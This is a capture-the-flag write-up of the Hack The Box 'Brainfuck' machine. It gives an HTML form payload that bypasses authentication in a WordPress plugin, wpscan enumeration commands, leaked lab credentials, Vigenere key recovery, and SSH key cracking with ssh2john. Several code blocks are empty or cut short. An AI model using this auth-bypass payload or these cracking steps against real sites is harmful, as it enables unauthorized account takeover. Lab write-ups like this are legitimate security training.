let start with web app. From the nmap result `Subject Alternative Name: DNS:www.brainfuck.htb, DNS:sup3rs3cr3t.brainfuck.htb` so let's add both hostname in our `/etc/hosts`
- sup3rs3cr3t.brainfuck.htb: Super Secret Forum
- https://brainfuck.htb/: wordpress.
- orestis@brainfuck.htb
let use `wpscan` to enumerate the site.
```console
$ wpscan --url https://brainfuck.htb/ --disable-tls-checks

From my experiences that wp plug-in is vulnerable. So after googling a bit I found an exploit that would work perfectly with this version. [link](https://www.exploit-db.com/exploits/41006) the problem is we do not have any username yet. let run `wpscan` again but this time for user enum
```console
$ wpscan --url https://brainfuck.htb/ --disable-tls-checks -e u

okay now we got username, let check the exploit
```html
<form method="post" action="http://wp/wp-admin/admin-ajax.php">
	Username: <input type="text" name="username" value="administrator">
	<input type="hidden" name="email" value="sth">
	<input type="hidden" name="action" value="loginGuestFacebook">
	<input type="submit" value="Login">
</form>
```

# user

from the exploit page `You can login as anyone without knowing password because of incorrect usage of wp_set_auth_cookie().` we will need to check `action` to point at our target.  and then just login as `admin`
```html
<form method="post" action="https://brainfuck.htb/wp-admin/admin-ajax.php">
	Username: <input type="text" name="username" value="admin">
	<input type="hidden" name="email" value="sth">
	<input type="hidden" name="action" value="loginGuestFacebook">
	<input type="submit" value="Login">
</form>
```
now put it in a .html file. and run python3 webserver
```
-bibo318@parrot:~/HTB/brainfuck$ nano exploit.html
[10.10.14.43]-bibo318@parrot:~/HTB/brainfuck$ zsh

```
visit your localhost and press submit on the exploit page, now you will get a response back from the server with `admin` cookie... cool right? If you want to see it in action then use burp suit to intercept the traffic


now visit brainfuck.htb again. you should notice that we can now visit wordpress dashboard. My plan was to modify a web page using edit future but we do not have permission to edit anything. I then check the `plug-in` again and found out that there is another plug-in call `Easy WP SMTP`. I check the setting and found out SMTP password is save in the plug-in. To see the hidden password, check src code
```html
<input type="password" name="swpsmtp_smtp_password" value="kHGuERB29DNiNE">
```
- orestis@brainfuck.htb:orestis:kHGuERB29DNiNE
it is obvious that the next step is check emails on SMTP. connect to email server using ur favorite mail client with the cred!. you will find an email sent from root.brainfuck.htb.
```
Hi there, your credentials for our "secret" forum are below :)

username: orestis
password: kIEnnfEKJ#9UmdO

Regards
```
Yeah! we got cred to the forum!! now visit `sup3rs3cr3t.brainfuck.htb` and login using `orestis:kIEnnfEKJ#9UmdO`.
Seem like *orestis* is asking for ssh key which is why admin create a encrypted thread where he post a like to the key. `mnvze://10.10.10.17/8zb5ra10m915218697q1h658wfoq0zc8/frmfycu/sp_ptr` this have to be the IP addr where we can get Orestis's ssh key!. 


the plan is running know plain text attack since we know that `Pieagnm - Jkoijeg nbw zwx mle grwsnn` = `Orestis - Hacking for fun and profit`. What we need is a key which they use to encrypt the message. Base on my CTF knowledge, I think it is a **Vigenere cipher**. how? `Orestis` = `Pieagnm` and both `s` in cipher text is `a` and `m` which mean it used a key. Also `Orestis - Hacking for fun and profit` is not always equal to `Pieagnm - Jkoijeg nbw zwx mle grwsnn`.
```
Orestis Hacking for fun and profit
Qbqquzs - Pnhekxs dpi fca fhf zdmgzt
Pieagnm - Jkoijeg nbw zwx mle grwsnn
Wejmvse - Fbtkqal zqb rso rnl cwihsf
```
let google for some for **Vigenere cipher known plain text attack**, I found this [tool](https://f00l.de/hacking/vigenere.php) which allow me to put in plaintext + cipher text and give me a key. which is `brainfuckmybrainfuckmybrainfu`. So the key should be either `brainfuckmy`, ` fuckmybrain`, or `mybrainfuck`. We will use the same site to decrypt the url to ssh key.


The real key is `fuckmybrain` which give us. `https://10.10.10.17/8ba5aa10e915218697d1c658cdee0bb8/orestis/id_rsa` let go and grab the key!! 
```console
──(kali㉿kali)-[~/HTB/brainfuck]

```
not a surprise, the key is encrypted!! let ssh2john and use Colabcat to decrypt it!
```console
$ /usr/share/john/ssh2john.py id_rsa > orestis.hash
```
the password is `3poulakia!` I google translate it and it mean 3 little bird. what a cute password. now ssh to the server using id_rsa + password

by looking at the code, I know this is RSA. Thank god that I have been doing some CTF challenge and had crack some of them. so we have **p, q. and e which is save in debug.txt** also the cipher text which is encrypted root.txt which is save in output.txt. I will use one of my script that I used when I do CTF. link [here](../../../writeUp/CTF/ractf/rsa2.py). modify it and just run then you will get the root flag

- output.txt = ct
- debug.txt 1st line = p
- debug.txt 2nd line = q
- debug.txt 3rd line = e

and run!!
